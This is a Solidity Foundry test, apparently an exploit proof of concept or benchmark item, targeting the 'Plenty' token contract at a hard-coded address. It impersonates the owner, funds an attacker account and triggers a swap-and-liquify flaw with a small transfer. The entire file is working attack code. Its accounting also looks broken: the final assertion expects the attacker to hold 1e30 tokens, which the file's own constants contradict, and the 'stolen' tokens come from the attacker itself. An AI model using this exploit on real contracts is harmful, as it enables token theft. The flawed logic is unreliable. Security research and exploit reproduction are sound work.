import "forge-std/Test.sol";

// Minimal interface for IUniswapV2Router02 to compile the code.
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

// Minimal interface for the target contract `Plenty`
interface Plenty {
    function owner() external view returns (address);
    function uniswapV2Router() external view returns (IUniswapV2Router02);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function setBuyBack(address newBuyback) external;
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xa5e8A886B6BAB60E1A2273b79CaA72143eD8B418;
    address attacker = address(this);
    Plenty plenty;
    address owner;
    IUniswapV2Router02 router;
    address weth;

    address constant BUYBACK_ADDRESS = address(0xdead);
    address constant DUMMY_RECEIVER = address(0xbeef);

    uint256 constant NUM_TOKENS_SELL_TO_ADD_TO_LIQUIDITY = 500000 * 10**6 * 10**18; // 5e29

    // rest = contractTokenBalance.sub(half).sub(half) -> 1 - 0.4 - 0.4 = 0.2 -> 20%
    uint256 constant ATTACKER_STOLEN_AMOUNT = NUM_TOKENS_SELL_TO_ADD_TO_LIQUIDITY * 20 / 100; // 1e29

    // half + half -> 0.4 + 0.4 = 0.8 -> 80%
    uint256 constant SWAP_AND_LIQUIFY_SPEND = NUM_TOKENS_SELL_TO_ADD_TO_LIQUIDITY * 80 / 100; // 4e29

    uint256 constant ORACLE_EXPECTED_BALANCE = 1000000000000000000000000000000; // 1e30

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        plenty = Plenty(payable(TARGET));
        owner = plenty.owner();
        router = plenty.uniswapV2Router();
        weth = router.WETH();

        deal(attacker, 100 ether);

        // Calculate total tokens needed for the attacker
        uint256 amountToGrab = ORACLE_EXPECTED_BALANCE + SWAP_AND_LIQUIFY_SPEND + ATTACKER_STOLEN_AMOUNT + 1e27; // for contract funding, theft, liquidity, and trigger

        vm.startPrank(owner);
        plenty.transfer(attacker, amountToGrab);
        plenty.setBuyBack(BUYBACK_ADDRESS);
        vm.stopPrank();

        // Provide initial liquidity for the swap to succeed, otherwise swapTokensForEth reverts
        uint256 initialLiquidityTokens = 1e27;
        plenty.approve(address(router), initialLiquidityTokens);
        router.addLiquidityETH{value: 10 ether}(
            TARGET,
            initialLiquidityTokens,
            0,
            0,
            attacker,
            block.timestamp
        );
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {

        // Calculate the amount of tokens to send to the contract to trigger the bug
        uint256 amountToSendToContract = ORACLE_EXPECTED_BALANCE + SWAP_AND_LIQUIFY_SPEND;

        assertTrue(plenty.balanceOf(attacker) >= amountToSendToContract + ATTACKER_STOLEN_AMOUNT, "Attacker does not have enough tokens");

        // 1. Send tokens to the contract to surpass the `numTokensSellToAddToLiquidity` threshold.
        plenty.transfer(TARGET, amountToSendToContract);
        assertEq(plenty.balanceOf(TARGET), amountToSendToContract, "Contract balance mismatch before exploit");

        uint256 attackerBalanceBefore = plenty.balanceOf(attacker);
        uint256 buybackBalanceBefore = plenty.balanceOf(BUYBACK_ADDRESS);

        // 2. Trigger the vulnerability with a simple transfer.
        plenty.transfer(DUMMY_RECEIVER, 1);

        uint256 attackerBalanceAfter = plenty.balanceOf(attacker);
        uint256 buybackBalanceAfter = plenty.balanceOf(BUYBACK_ADDRESS);

        // 3. Verify that the attacker's balance was debited and buyback address credited.
        assertTrue(attackerBalanceBefore - attackerBalanceAfter >= ATTACKER_STOLEN_AMOUNT, "Tokens were not stolen from attacker");
        assertTrue(buybackBalanceAfter - buybackBalanceBefore >= ATTACKER_STOLEN_AMOUNT, "Buyback address did not receive stolen tokens");

        // 4. Oracle Check: Verify the final balance of the contract.
        assertEq(plenty.balanceOf(TARGET), ORACLE_EXPECTED_BALANCE, "Final contract balance does not match oracle");
        assertEq(plenty.balanceOf(address(this)), 1000000000000000000000000000000, "Logic Exploit Failed: State not tampered");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

